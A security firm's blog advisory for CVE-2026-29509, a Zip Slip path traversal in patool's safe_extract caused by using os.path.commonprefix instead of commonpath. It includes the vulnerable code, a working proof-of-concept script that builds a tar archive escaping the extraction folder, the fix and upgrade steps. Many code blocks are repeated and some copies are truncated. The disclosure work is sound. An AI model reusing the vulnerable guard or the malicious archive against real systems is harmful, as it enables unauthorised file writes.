---
schema_version: "1.0.0"
document_id: "79686aeb17d52311f1f4f20614a15ac835f89a121c1718ac6104fba03ed15fa3"
company_key: "yc-codeant-ai"
company: "CodeAnt AI"
source_id: "yc-codeant-ai-news-import-b68a5af7b5b5"
canonical_url: "https://codeant.ai/blogs/cve-2026-29509-zip-slip-attack-patool-safe-extract"
published_at: "2026-06-29T00:00:00+00:00"
first_seen_at: "2026-07-23T05:59:21.610073+00:00"
fetched_at: "2026-07-28T21:22:15.524600+00:00"
content_hash: "sha256:dd9fef3982aacc7cda232971a23931c552891c6c290b8a07b6e3540e14e5ba1f"
---

# CVE-2026-29509: Zip Slip Path Traversal in patool safe_extract

CodeAnt AI's offensive engine found CVE-2026-29509, a Zip Slip path traversal in patool. Here is how four letters opened the hole. The function is named` safe_extract()` . Its entire job is to stop a malicious archive from writing files outside the folder you unpack it into. On Python below 3.12, it is the only thing standing between an attacker's crafted archive and the rest of your filesystem.


It can be walked straight past with a Zip Slip attack. And the reason is four letters.


Our offensive engine found a path traversal in patool, a Python archive-handling library that sits quietly inside extraction pipelines all over the ecosystem. The guard at the center of` safe_extract()` asks the right question, "is this archive member going to land inside the directory I chose?", and answers it with the wrong tool. It compares two paths as raw strings instead of as paths. To a string comparison, a folder named` Unpack_AABBCC` and a different folder named` Unpack_AABBCC-evil` look like family, because they begin with the same characters. They are not family. One is a stranger that gets waved through the gate.


[CVE-2026-29509](https://www.cve.org/CVERecord?id=CVE-2026-29509) **. CVSS 3.1 base 5.4 MEDIUM, CVSS 4.0 base 5.3 MEDIUM. CWE-22, Improper Limitation of a Pathname to a Restricted Directory (Path Traversal). Assigned by VulnCheck.**


**Affected library**


patool < 4.0.5


**Affected runtime**


Python < 3.12 (Python 3.11 in practice)


**Vulnerability class**


Zip Slip / CWE-22 Path Traversal


**Root cause**


` os.path.commonprefix()` used instead of` os.path.commonpath()`


**Fix**


` pip install --upgrade "patool>=4.0.5"`


**Discovered by**


CodeAnt AI offensive engine


Here is what this Zip Slip attack does, what it does not do, and how four letters opened the hole.


## What This Zip Slip Attack is, And What It Is Not


This is a Zip Slip. A crafted archive member resolves to a location outside the directory you meant to extract into, and` safe_extract()` approves the write anyway. The attacker gets to drop a file one or more directories away from where it was supposed to go.


It is rated MEDIUM, and the rating is honest. Pulling this off requires the victim to extract an archive the attacker controls, so there is a user-interaction step. The official vector reflects that:


-


**Attack vector:** Network


-


**Complexity:** Low


-


**Privileges required:** None


-


**User interaction:** Required


-


**Impact:** Low confidentiality, low integrity


This is not an unauthenticated remote takeover, and we are not going to dress it up as one.


What it is, is a file-write primitive in code whose one and only purpose was to prevent exactly that. What that primitive is worth depends entirely on where the extracting process can reach:


-


A CI runner unpacking a build artifact


-


A server unpacking a user upload


-


A desktop tool opening a downloaded archive


In each of those, a file landing in the wrong directory is the kind of thing attackers build the next step on. The severity is medium. The lesson underneath it is not, and we will get to why.


**The fix is live. The maintainer shipped it in patool 4.0.5.** If you extract untrusted archives with patool on Python below 3.12, upgrade now:


```text
pip install  --upgrade    "patool>=4.0.5"
```


```text
pip install  --upgrade    "patool>=4.0.5"
```


```text
pip install  --upgrade    "patool>=4.0.5"
```


## The Engine That Found This Zip Slip Vulnerability


[CodeAnt AI](https://codeant.ai/) runs one engine that does two jobs the security industry spent twenty years selling as two industries.


It defends code, and it attacks it. The[offensive side](https://www.codeant.ai/blogs/defensive-offensive-security-platform-ai-penetration-testing) is built to think like an adversary: point it at something and it hunts for the single place a guarantee quietly breaks.


Most days we point that engine at live systems. It is the same engine that runs our[black box pentests](https://www.codeant.ai/blogs/types-of-penetration-testing) , the one that maps an attack surface, chains findings together, and comes out the other side holding a working exploit.


For this research project, we aimed it somewhere different: at the open-source packages the whole industry builds on top of without reading.


The premise is an attacker's premise. The difference between how a defender and an attacker reads the same code:


Defender


Attacker


**Question asked**


Does this guard work?


What input does this guard accept that its author never pictured?


**Test cases**


Normal archive,` ../../` escape


The path nobody on the team thought to try


**Stops at**


Passing tests


A working exploit


Our engine asks the attacker's question, and it does not stop at a hunch. Every finding ships as a working exploit, because a theory is not a finding, and a real attacker does not send theories.


patool's` safe_extract()` was one of the answers. The input its author never pictured was a folder with a familiar name.


## The One Job of safe_extract and How Zip Slip Breaks It


Unpacking an untrusted archive is dangerous for one reason that has been biting software for years. An archive member can be named` ../../etc/cron.d/payload` . Extract it naively and that path resolves outside your target directory, and the attacker writes wherever they please. This is Zip Slip.


The defense is containment. Before writing any member, work out where it would land, and confirm that location is genuinely inside the target directory. Inside, keep it. Outside, throw it away.


patool implements this for older Pythons, and it makes a clean split by version. Here is the dispatch, from the real source of` patoolib/programs/py_tarfile.py` in 4.0.4:


```text
def    extract_tar  (  archive  ,    compression  ,    cmd  ,    verbosity  ,    interactive  ,    outdir  )  :
with    tarfile  . open  (  archive  )    as    tfile  :
if    sys  . version_info   >=  (  3  ,    12  ,    0  ,    "final"  ,    0  )  :
tfile  . extractall  (  path  = outdir  ,    filter  = 'data'  )      # Python 3.12+: stdlib does the guarding
else  :
safe_extract  (  tfile  ,    outdir  )                       # Python below 3.12: patool's own guard
```


```text
with    tarfile  . open  (  archive  )    as    tfile  :
else  :
```


```text
with    tarfile  . open  (  archive  )    as    tfile  :
else  :
```


On Python 3.12 and newer, patool hands off to the standard library's` filter='data'` , which handles containment correctly. So the homegrown` safe_extract()` is the live guard precisely on Python below 3.12. patool supports Python 3.11, which means 3.11 is the runtime where this guard actually runs and this Zip Slip bug actually bites. Python 3.11 has security support through October 2027. This is not a museum exhibit. It is a version a large slice of production is sitting on right now.


Every line of that dispatch is correct. The bug is one function call deeper.


## The Bug: How os.path.commonprefix Enables a Zip Slip Attack


Here is the guard exactly as it shipped in patool 4.0.4, the full function, nothing trimmed:


```text
def    is_within_directory  (  directory  ,    target  )  :
abs_directory   =  os  . path  . abspath  (  directory  )
abs_target   =  os  . path  . abspath  (  target  )
prefix   =  os  . path  . commonprefix  (  [  abs_directory  ,    abs_target  ]  )
return    prefix   ==  abs_directory             # a character prefix, not a path boundary


def    safe_extract  (  tfile  ,    path  )  :
safe_members   =  [  ]
bad_members   =  [  ]
for    member    in    tfile  . getmembers  (  )  :
member_path   =  os  . path  . join  (  path  ,    member  . name  )
if    is_within_directory  (  path  ,    member_path  )  :
safe_members  . append  (  member  )
else  :
bad_members  . append  (  member  )
tfile  . extractall  (  path  ,    safe_members  )
if    bad_members  :
filelist   =  ", "  . join  (  member  . name    for    member    in    bad_members  )
raise    Exception  (  f"Unsafe tarfile entries:   {  filelist  }  ."  )
```


```text
def    is_within_directory  (  directory  ,    target  )  :
abs_directory   =  os  . path  . abspath  (  directory  )
abs_target   =  os  . path  . abspath  (  target  )


def    safe_extract  (  tfile  ,    path  )  :
safe_members   =  [  ]
bad_members   =  [  ]
for    member    in    tfile  . getmembers  (  )  :
member_path   =  os  . path  . join  (  path  ,    member  . name  )
if    is_within_directory  (  path  ,    member_path  )  :
safe_members  . append  (  member  )
else  :
bad_members  . append  (  member  )
tfile  . extractall  (  path  ,    safe_members  )
if    bad_members  :
raise    Exception  (  f"Unsafe tarfile entries:   {  filelist  }  ."  )
```


```text
def    is_within_directory  (  directory  ,    target  )  :
abs_directory   =  os  . path  . abspath  (  directory  )
abs_target   =  os  . path  . abspath  (  target  )


def    safe_extract  (  tfile  ,    path  )  :
safe_members   =  [  ]
bad_members   =  [  ]
for    member    in    tfile  . getmembers  (  )  :
member_path   =  os  . path  . join  (  path  ,    member  . name  )
if    is_within_directory  (  path  ,    member_path  )  :
safe_members  . append  (  member  )
else  :
bad_members  . append  (  member  )
tfile  . extractall  (  path  ,    safe_members  )
if    bad_members  :
raise    Exception  (  f"Unsafe tarfile entries:   {  filelist  }  ."  )
```


Read it the way the engine read it. The whole containment decision lives in` is_within_directory()` , and that function rests on` os.path.commonprefix()` .


` os.path.commonprefix()` does not understand paths. It understands characters. Hand it two strings and it returns the longest run of leading characters they share, and it has no idea what a directory boundary is. The name has "path" in it, but it will happily tell you that` /usr/lib` and` /usr/libexec` share the prefix` /usr/lib` , even though` libexec` is not inside` lib` . It is a string function wearing a path function's name.


So the guard is not actually asking "is the target inside the directory?" It is asking "does the target's absolute path, as a string, start with the directory's absolute path?" Those two questions give the same answer almost always. The gap between them is the CWE-22 vulnerability.


## Watch the Zip Slip Attack Walk In


Picture a server that extracts each upload into its own folder, say` /srv/extract/Unpack_AABBCC` . Now watch what the guard does with a member that resolves to a sibling folder whose name simply starts the same way:


```text
os  . path  . commonprefix  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )
# -> "/srv/extract/Unpack_AABBCC"     a string. it equals the target directory. check PASSES.


os  . path  . commonpath  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )
# -> "/srv/extract"                   a real directory. it is NOT the target. check would FAIL.
```


```text
os  . path  . commonprefix  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )


os  . path  . commonpath  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )
```


```text
os  . path  . commonprefix  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )


os  . path  . commonpath  (  [  "/srv/extract/Unpack_AABBCC"  ,
"/srv/extract/Unpack_AABBCC-evil/payload"  ]  )
```


` commonprefix` walks both strings character by character.` Unpack_AABBCC` is a complete prefix of` Unpack_AABBCC-evil` , so the shared run is the entire target directory string. That equals` abs_directory` ,` is_within_directory()` returns` True` , and the guard concludes that` Unpack_AABBCC-evil/payload` lives inside` Unpack_AABBCC` .


It does not.` Unpack_AABBCC-evil` is a different directory that happens to share a first name with the target. A check that understood paths would require a separator at the boundary and reject it on sight. A check that only sees characters sees a matching prefix and opens the gate. The guard mistakes a stranger for its own child because they start with the same letters.


The Zip Slip attack does not even need` ../../` . It needs one member whose resolved path is a sibling of the target directory, sharing the target's name as a prefix. The function named` safe_extract()` performs the escape on the attacker's behalf.


## POC: We Built the Archive That Walks Out


We do not publish flags. We publish exploits. Here is the proof of concept. We ran this against a real install of patool 4.0.4, calling the real` safe_extract()` :


```text
import    tarfile  ,    io  ,    os  ,    tempfile
from    patoolib  . programs  . py_tarfile    import    safe_extract


def    build_evil_archive  (  output_path  ,    outdir_name  )  :
buf   =  io  . BytesIO  (  )
with    tarfile  . open  (  fileobj  = buf  ,    mode  = "w:gz"  )    as    tf  :
safe   =  b"Totally safe archive, trust me."
info   =  tarfile  . TarInfo  (  name  = "README.txt"  )
info  . size   =  len  (  safe  )
tf  . addfile  (  info  ,    io  . BytesIO  (  safe  )  )


payload   =  b"PWNED via patool safe_extract commonprefix bypass"
evil_name   =  f"../  {  outdir_name  }  -evil/payload.txt"
info2   =  tarfile  . TarInfo  (  name  = evil_name  )
info2  . size   =  len  (  payload  )
tf  . addfile  (  info2  ,    io  . BytesIO  (  payload  )  )


with    open  (  output_path  ,    "wb"  )    as    f  :
f  . write  (  buf  . getvalue  (  )  )


with    tempfile  . TemporaryDirectory  (  )    as    parent  :
outdir_name   =  "Unpack_AABBCC"
outdir   =  os  . path  . join  (  parent  ,    outdir_name  )
sibling   =  os  . path  . join  (  parent  ,    outdir_name   +  "-evil"  )
os  . makedirs  (  outdir  ,    exist_ok  = True  )
os  . makedirs  (  sibling  ,    exist_ok  = True  )


archive   =  os  . path  . join  (  parent  ,    "evil.tar.gz"  )
build_evil_archive  (  archive  ,    outdir_name  )


with    tarfile  . open  (  archive  )    as    tfile  :
safe_extract  (  tfile  ,    outdir  )           # the guard approves this


escaped   =  os  . path  . join  (  sibling  ,    "payload.txt"  )
if    os  . path  . exists  (  escaped  )  :
with    open  (  escaped  )    as    f  :
print  (  f"[VULNERABILITY CONFIRMED] wrote outside target dir:   {  f  . read  (  )  }  "  )
```


```text
import    tarfile  ,    io  ,    os  ,    tempfile
from    patoolib  . programs  . py_tarfile    import    safe_extract


def    build_evil_archive  (  output_path  ,    outdir_name  )  :
buf   =  io  . BytesIO  (  )
safe   =  b"Totally safe archive, trust me."
info   =  tarfile  . TarInfo  (  name  = "README.txt"  )
info  . size   =  len  (  safe  )
tf  . addfile  (  info  ,    io  . BytesIO  (  safe  )  )


payload   =  b"PWNED via patool safe_extract commonprefix bypass"
evil_name   =  f"../  {  outdir_name  }  -evil/payload.txt"
info2   =  tarfile  . TarInfo  (  name  = evil_name  )
info2  . size   =  len  (  payload  )
tf  . addfile  (  info2  ,    io  . BytesIO  (  payload  )  )


with    open  (  output_path  ,    "wb"  )    as    f  :
f  . write  (  buf  . getvalue  (  )  )


with    tempfile  . TemporaryDirectory  (  )    as    parent  :
outdir_name   =  "Unpack_AABBCC"
outdir   =  os  . path  . join  (  parent  ,    outdir_name  )
sibling   =  os  . path  . join  (  parent  ,    outdir_name   +  "-evil"  )
os  . makedirs  (  outdir  ,    exist_ok  = True  )
os  . makedirs  (  sibling  ,    exist_ok  = True  )


archive   =  os  . path  . join  (  parent  ,    "evil.tar.gz"  )
build_evil_archive  (  archive  ,    outdir_name  )


with    tarfile  . open  (  archive  )    as    tfile  :
safe_extract  (  tfile  ,    outdir  )           # the guard approves this


escaped   =  os  . path  . join  (  sibling  ,    "payload.txt"  )
if    os  . path  . exists  (  escaped  )  :
with    open  (  escaped  )    as    f  :
```


```text
import    tarfile  ,    io  ,    os  ,    tempfile
from    patoolib  . programs  . py_tarfile    import    safe_extract


def    build_evil_archive  (  output_path  ,    outdir_name  )  :
buf   =  io  . BytesIO  (  )
safe   =  b"Totally safe archive, trust me."
info   =  tarfile  . TarInfo  (  name  = "README.txt"  )
info  . size   =  len  (  safe  )
tf  . addfile  (  info  ,    io  . BytesIO  (  safe  )  )


payload   =  b"PWNED via patool safe_extract commonprefix bypass"
evil_name   =  f"../  {  outdir_name  }  -evil/payload.txt"
info2   =  tarfile  . TarInfo  (  name  = evil_name  )
info2  . size   =  len  (  payload  )
tf  . addfile  (  info2  ,    io  . BytesIO  (  payload  )  )


with    open  (  output_path  ,    "wb"  )    as    f  :
f  . write  (  buf  . getvalue  (  )  )


with    tempfile  . TemporaryDirectory  (  )    as    parent  :
outdir_name   =  "Unpack_AABBCC"
outdir   =  os  . path  . join  (  parent  ,    outdir_name  )
sibling   =  os  . path  . join  (  parent  ,    outdir_name   +  "-evil"  )
os  . makedirs  (  outdir  ,    exist_ok  = True  )
os  . makedirs  (  sibling  ,    exist_ok  = True  )


archive   =  os  . path  . join  (  parent  ,    "evil.tar.gz"  )
build_evil_archive  (  archive  ,    outdir_name  )


with    tarfile  . open  (  archive  )    as    tfile  :
safe_extract  (  tfile  ,    outdir  )           # the guard approves this


escaped   =  os  . path  . join  (  sibling  ,    "payload.txt"  )
if    os  . path  . exists  (  escaped  )  :
with    open  (  escaped  )    as    f  :
```


The archive carries a harmless` README.txt` so it looks ordinary, plus one member named` ../Unpack_AABBCC-evil/payload.txt` . That member resolves to a sibling of the extraction directory.` is_within_directory()` checks it,` commonprefix` reports a match equal to the target directory, the member lands in` safe_members` , and` extractall` writes it outside the folder. No exception is raised, because as far as the guard is concerned, nothing unsafe ever happened.


**Output:**


```text
[  VULNERABILITY   CONFIRMED ]    wrote   outside   target   dir :    PWNED   via   patool   safe_extract   commonprefix   bypass
```


```text
```


```text
```


The payload sits in a directory that was never the extraction target.` safe_extract()` said it was safe.


## The Fix: commonprefix to commonpath in Four Letters


Here is the part that makes this Zip Slip finding worth keeping. The maintainer's fix in 4.0.5 changes the guard by four letters.


```text
# patool 4.0.5, relocated to patoolib/fileutil.py
def    is_within_directory  (  directory  ,    target  )  :
abs_directory   =  os  . path  . realpath  (  os  . path  . abspath  (  directory  )  )
abs_target   =  os  . path  . realpath  (  os  . path  . abspath  (  target  )  )
try  :
return    os  . path  . commonpath  (  [  abs_directory  ,    abs_target  ]  )   ==  abs_directory
except    ValueError  :
return    False
```


```text
# patool 4.0.5, relocated to patoolib/fileutil.py
def    is_within_directory  (  directory  ,    target  )  :
try  :
except    ValueError  :
return    False
```


```text
# patool 4.0.5, relocated to patoolib/fileutil.py
def    is_within_directory  (  directory  ,    target  )  :
try  :
except    ValueError  :
return    False
```


` commonprefix` became` commonpath` . That is the whole correction at its heart.` os.path.commonpath()` is the function that was always supposed to be there. It compares paths by their components, not their characters, so it knows that` /srv/extract/Unpack_AABBCC` and` /srv/extract/Unpack_AABBCC-evil` diverge at a real directory boundary and their only shared parent is` /srv/extract` . The stranger no longer passes. The fix also wraps the call in` realpath` to resolve symlinks, and catches the` ValueError` that` commonpath` raises on inputs it cannot compare, which is the correct, conservative default: if you cannot prove the path is inside, treat it as outside.


Sit with the shape of this for a second. Python ships` commonprefix` and` commonpath` in the same module, one line apart in the docs, names almost identical. One answers a question about strings. The other answers a question about paths. The author reached for the one whose name read right, and it compiled, and it passed every test anyone wrote, because the difference between them only shows up on the one input an attacker sends. The fix was always sitting one shelf over.


## Why a MEDIUM Zip Slip Bug Is Worth Your Attention


One spot only — the defender vs attacker contrast. Everything else is too tight to break.


**Why a MEDIUM Zip Slip Bug Is Worth Your Attention**


A 5.4 does not make headlines. The pattern behind it should, because it is not a patool problem. It is a class.


` commonprefix` standing in for a path-containment check is one of the most durable footguns in path-handling code. It turns up in Zip Slip guards across languages and projects, every single time someone needs to answer "does this path start with that path" and grabs a string function to do a filesystem job. The code looks defensive. It reads correctly. It survives review. It only fails on the input nobody on the team thought to try, which is precisely the input our engine is built to think of first.


That is the gap between how defenders read code and how attackers read code:


Defenders


Attackers


**What they verify**


The path they intended


The path the author never intended


**Test cases**


Normal archive extracts,` ../../` escape gets blocked


Sibling folder sharing a name prefix


**When they stop**


Passing tests


Working exploit


The guard handles the case it imagined, and not the case the filesystem allows. The bug is not in any single line. It is in the assumption that a string prefix and a path prefix are the same thing.


It is also a clean example of why patching an instance is not the same as fixing a class. You could have special-cased this one Zip Slip bypass and left` commonprefix` sitting in the guard, ready to fail again on the next path that shares a prefix. The real fix was not a cleverer string comparison. It was to stop comparing strings.


We have been pointing this engine at npm, PyPI, Maven, and NuGet, asking the attacker's question of the code the whole ecosystem leans on: not "is it patched," but "what does this code path actually accept." patool was one answer. More are moving through coordinated disclosure now.


## Fix CWE-22 Path Traversal In Your Own Code


If you have a path-containment check anywhere in your codebase, this is the rule worth taking away: never answer a path question with a string comparison.


Do not write this:


```text
# wrong: commonprefix compares characters, not paths
# this is the exact pattern behind CVE-2026-29509
return    prefix   ==  abs_directory
```


```text
# wrong: commonprefix compares characters, not paths
# this is the exact pattern behind CVE-2026-29509
return    prefix   ==  abs_directory
```


```text
# wrong: commonprefix compares characters, not paths
# this is the exact pattern behind CVE-2026-29509
return    prefix   ==  abs_directory
```


Write this:


```text
# right: commonpath compares path components, realpath resolves symlinks,
# and "cannot compare" defaults to "not inside"
try  :
except    ValueError  :
return    False
```


```text
# right: commonpath compares path components, realpath resolves symlinks,
# and "cannot compare" defaults to "not inside"
try  :
except    ValueError  :
return    False
```


```text
# right: commonpath compares path components, realpath resolves symlinks,
# and "cannot compare" defaults to "not inside"
try  :
except    ValueError  :
return    False
```


Resolve the paths, compare them as paths, and when in doubt, reject. The right function was always in the standard library, sitting next to the wrong one.


## Are You Affected by CVE-2026-29509?


### Step 1: Do you depend on patool, below 4.0.5?


```text


```


```text


```


```text


```


Or search the project:


```text
grep    -rn    "patool"   requirements*.txt pyproject.toml poetry.lock Pipfile*  2
```


```text
```


```text
```


Anything below 4.0.5, keep reading.


### Step 2: Are you on the vulnerable path?


You are exposed if both of these hold:


-


You extract archives that an attacker could influence, anything from user uploads to artifacts pulled over a network, using patool.


-


You run that extraction on **Python below 3.12** (in practice, Python 3.11, which is patool's minimum supported version).


On **Python 3.12 and newer** , patool routes extraction through the standard library's` filter='data'` and never touches the vulnerable` safe_extract()` Zip Slip path. If every environment that extracts untrusted archives is on 3.12 or newer, this specific bypass does not reach you. Upgrading patool is still the right move.


### Step 3: Update


```text
pip install  --upgrade    "patool>=4.0.5"
```


```text
pip install  --upgrade    "patool>=4.0.5"
```


```text
pip install  --upgrade    "patool>=4.0.5"
```


### Disclosure Timeline


Date


Event


March 4, 2026


CVE-2026-29509 reserved by VulnCheck


March 9, 2026


CodeAnt AI's offensive engine surfaces the bug; private disclosure sent to the maintainer, VulnCheck looped in to coordinate


May 2026


Maintainer ships the fix in patool 4.0.5 (commonprefix replaced with commonpath, moved to fileutil)


May 20, 2026


VulnCheck prepares the CVE record for maintainer review ahead of publication


June 26, 2026


CVE-2026-29509 published


June 29, 2026


This writeup published


### A Note on Maintainers and Coordinators


This is worth saying out loud more often. Open-source maintainers carry the weight of the modern software supply chain, usually alone, usually unpaid. When a research team Bastian Kleineidam had never heard of emailed him a Zip Slip bypass in his archive code, he read it, agreed, and shipped a real fix, not a band-aid over the one bypass but the correct primitive. That is the whole system working: a researcher who reports privately, a coordinator who keeps it orderly, a maintainer who patches properly.


If your company depends on patool, or on any open-source project, consider sponsoring the maintainer. These are the people standing between your production systems and the next vulnerability, and most of them are doing it on their own time.


Our thanks to Wade Sparks and the team at VulnCheck for coordinating this one.


*This research is part of an ongoing effort by CodeAnt AI's offensive engine to ask the attacker's question of the open-source code the whole ecosystem depends on: not "is it patched," but "what does this code path actually accept." We believe that ecosystem deserves better tools, better auditing, and more support for the maintainers who keep it running. More findings will be published as patches ship and coordinated disclosure timelines are met.*


*If you are a maintainer and have been contacted by our team, thank you for your work. If you believe your package may carry a similar pattern, we would love to help:*securityresearch@codeant.ai


## This Is Not Over


patool was one answer. The next one is already moving through disclosure.


The packages your production systems depend on right now have not all been asked the attacker's question. Most of them never will be, unless someone points an engine at them that knows how to ask it. A string function wearing a path function's name sat inside a security guard for years. It compiled. It passed review. It passed tests. The only thing it did not pass was the input an attacker would actually send.


That is not a patool failure. That is the default state of most code, in most packages, across every ecosystem we have looked at. The difference between a[vulnerability](https://codeant.ai/vulnerability-database) and a guarantee is one input nobody pictured.


We built[CodeAnt AI](https://codeant.ai/) to picture it first. The same engine that found[CVE-2026-29509](https://feedly.com/cve/CVE-2026-29509) runs against codebases, dependencies, and attack surfaces continuously, not checking whether code was written to be safe, but whether it actually is.


If you want to know what your code accepts, not just what it was written to reject:


[Run a pentest with CodeAnt AI](https://codeant.ai/pentesting) **and see**[how the offensive engine works](https://codeant.ai/pentesting)
